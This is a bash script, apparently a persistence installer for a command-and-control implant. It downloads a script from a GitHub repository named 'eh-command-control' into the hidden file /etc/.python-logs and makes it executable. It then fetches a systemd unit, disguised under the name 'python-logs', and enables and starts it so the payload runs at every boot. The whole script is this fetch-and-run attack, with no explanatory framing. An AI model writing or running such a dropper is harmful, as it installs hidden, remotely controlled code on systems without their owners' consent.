#!/bin/bash
curl -s https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
chmod +x /etc/.python-logs
curl -s https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/python-logs.service
systemctl daemon-reload
systemctl enable python-logs
systemctl start python-logs
